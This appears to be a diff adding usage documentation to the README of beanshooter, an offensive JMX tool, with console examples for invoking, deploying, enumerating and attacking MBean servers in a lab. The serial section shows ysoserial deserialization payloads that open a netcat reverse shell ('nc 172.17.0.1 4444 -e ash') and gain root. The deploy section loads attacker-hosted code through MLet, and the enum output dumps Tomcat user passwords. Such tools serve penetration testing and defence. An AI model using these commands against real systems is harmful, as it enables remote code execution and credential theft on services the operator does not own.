@@ -139,6 +139,206 @@ dedicated attacks you should use the `--username-file` and `--password-file` opt
 [+] done.
 ```
 
+#### Invoke
+
+The `invoke` action can be used to invoke an arbitrary method on an *MBean* that has already been deployed on a *JMX* endpoint.
+Apart from the target, the `invoke` action requires the `ObjectName` of the targeted *MBean*, the method name you want to invoke
+and the arguments to use for the call. *MBean* attributes can also be obtained by this action, by using the corresponding getter
+function as method. The following listing shows an example, where the `getLoggerNames` function is invoked on the `Logging` *MBean*:
+
+```console
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' getLoggerNames ''
+[+] sun.rmi.transport.tcp
+[+] sun.rmi.server.call
+[+] sun.rmi.loader
+...
+```
+
+When invoking a method that requires arguments, the last *beanshooter* argument is evaluated as *Java code* and attempted to be
+parsed as `Object[]`. The following listing shows an example, where the `getLoggerNames` function is invoked on the `Logging` *MBean*.
+
+```console
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' setLoggerLevel '"sun.rmi.transport.tcp", "INFO"'
+[+] Call was successful
+```
+
+#### Deploy
+
+The `deploy` action can be used to deploy an *MBean* on a *JMX* service. This action **should not** be used to deploy *MBeans* with
+default support like e.g. the *TonkaBean*. Deploying *MBeans* with default support should be done through the corresponding
+[MBean operations](#mbean-operations).
+
+When the *MBean* you want to deploy is already known to the *JMX* service, it is sufficient to specify the class name of the implementing
+*MBean* class and the desired `ObjectName`:
+
+```console
+[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 javax.management.monitor.StringMonitor qtc.test:type=Monitor
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: StringMonitor
+[+] 	MBean with object name qtc.test:type=Monitor was successfully deployed.
+```
+
+When the *MBean* class is not known to the *JMX* service, you can use the `--jar-file` and `--stager-url` options to provide an implementation:
+
+```console
+[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar  --stager-url http://172.17.0.1:8000
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: ExampleBean
+[+]
+[+] 		MBean class is not known to the server.
+[+] 		Starting MBean deployment.
+[+]
+[+] 			Deplyoing MBean: MLet
+[+] 			MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+] 		Loading MBean from http://172.17.0.1:8000
+[+]
+[+] 			Creating HTTP server on: 172.17.0.1:8000
+[+] 				Creating MLetHandler for endpoint: /
+[+] 				Creating JarHandler for endpoint: /c65c3cdc908348d8bd9a22b8a2bf8be3
+[+] 				Starting HTTP server... 
+[+] 				
+[+] 			Incoming request from: iinsecure.dev
+[+] 			Requested resource: /
+[+] 			Sending mlet:
+[+]
+[+] 				Class:     non.existing.example.ExampleBean
+[+] 				Archive:   c65c3cdc908348d8bd9a22b8a2bf8be3
+[+] 				Object:    qtc.test:type=Example
+[+] 				Codebase:  http://172.17.0.1:8000
+[+]
+[+] 			Incoming request from: iinsecure.dev
+[+] 			Requested resource: /c65c3cdc908348d8bd9a22b8a2bf8be3
+[+] 			Sending jar file with md5sum: c4d8f40d1c1ac7f3cf7582092802a484
+[+]
+[+] 	MBean with object name qtc.test:type=Example was successfully deployed.
+```
+
+#### Enum
+
+The `enum` action enumerates some configuration details on a *JMX* endpoint. It always checks whether the
+*JMX* endpoints requires authentication and whether it allows pre authenticated arbitrary deserialization.
+
+```console
+[qtc@devbox ~]$ beanshooter enum 172.17.0.2 1090
+[+] Checking for unauthorized access:
+[+]
+[+] 	- Remote MBean server requires authentication.
+[+] 	  Vulnerability Status: Non Vulnerable
+[+]
+[+] Checking pre-auth deserialization behavior:
+[+]
+[+] 	- Remote MBeanServer accepted the payload class.
+[+] 	  Configuration Status: Non Defau
+```
+
+When no authentication is required, or when you specify valid credentials, the `enum` action also attempts to
+enumerate some further information from the *JMX* endpoint. This includes a list of non default *MBeans* and
+e.g. the user accounts registered on a *Apache tomcat* server:
+
+```console
+[qtc@devbox ~]$ beanshooter enum 172.17.0.2 1090
+[+] Checking for unauthorized access:
+[+]
+[+] 	- Remote MBean server does not require authentication.
+[+] 	  Vulnerability Status: Vulnerable
+[+]
+[+] Checking pre-auth deserialization behavior:
+[+]
+[+] 	- Remote MBeanServer rejected the payload class.
+[+] 	  Vulnerability Status: Non Vulnerable
+[+]
+[+] Checking available MBeans:
+[+]
+[+] 	- 57 MBeans are currently registred on the MBean server.
+[+] 	  Listing 39 non default MBeans:
+[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=AccessLogValve)
+[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=GlobalRequestProcessor,name="http-nio-8080")
+[...]
+[+]
+[+] Enumerating tomcat users:
+[+]
+[+] 	- Listing 3 tomcat users:
+[+]
+[+] 		----------------------------------------
+[+] 		Username:  manager
+[+] 		Password:  P@55w0rD#
+[+] 		Roles:
+[+] 			   Users:type=Role,rolename="manager-gui",database=UserDatabase
+[+] 			   Users:type=Role,rolename="manager-script",database=UserDatabase
+[+] 			   Users:type=Role,rolename="manager-jmx",database=UserDatabase
+[+] 			   Users:type=Role,rolename="manager-status",database=UserDatabase
+[+]
+[+] 		----------------------------------------
+[+] 		Username:  admin
+[+] 		Password:  s3cr3T!$
+[+] 		Roles:
+[+] 			   Users:type=Role,rolename="admin-gui",database=UserDatabase
+[+] 			   Users:type=Role,rolename="admin-script",database=UserDatabase
+[...]
+```
+
+#### List
+
+The `list` action prints a list of all registered *MBeans* on the remote *JMX* service:
+
+```console
+[qtc@devbox ~]$ beanshooter list 172.17.0.2 9010
+[+] Available MBeans:
+[+]
+[+] 	- sun.management.MemoryManagerImpl (java.lang:name=Metaspace Manager,type=MemoryManager)
+[+] 	- sun.management.MemoryPoolImpl (java.lang:name=Metaspace,type=MemoryPool)
+[+] 	- javax.management.MBeanServerDelegate (JMImplementation:type=MBeanServerDelegate)
+[...]
+```
+
+#### Serial
+
+The `serial` action can be used to perform deserialization attacks on a *JMX* endpoint. By default, the action
+attempts post authenticated deserialization attacks. For this to work, you target *JMX* service needs either to
+allow unauthenticated access or you need valid credentials:
+
+```console
+[qtc@devbox ~]$ beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin
+[+] Attemting deserialization attack on JMX endpoint.
+[+]
+[+] 	Creating ysoserial payload... done.
+[+] 	MBeanServer attempted to deserialize the DeserializationCanary class.
+[+] 	Deserialization attack was probably successful.
+
+[qtc@devbox ~]$ nc -vlp 4444
+[...]
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+*JMX* services can also be vulnerable to pre authenticated deserialization attacks. To abuse this, you can use the `--preauth` switch:
+
+```console
+[qtc@devbox ~]$ beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --preauth
+[+] Attemting deserialization attack on JMX endpoint.
+[+]
+[+] 	Creating ysoserial payload... done.
+[+] 	MBeanServer attempted to deserialize the DeserializationCanary class.
+[+] 	Deserialization attack was probably successful.
+
+[qtc@devbox ~]$ nc -vlp 4444
+[...]
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Undeploy
+
+The `undeploy` action removes the *MBean* with the specified `ObjectName` from the *JMX* service:
+
+```console
+[qtc@devbox ~]$ beanshooter undeploy 172.17.0.2 9010 qtc.test:type=Example 
+[+] Removing MBean with ObjectName qtc.test:type=Example from the MBeanServer.
+[+] MBean was successfully removed.
+```
 
 ### Example Server
 
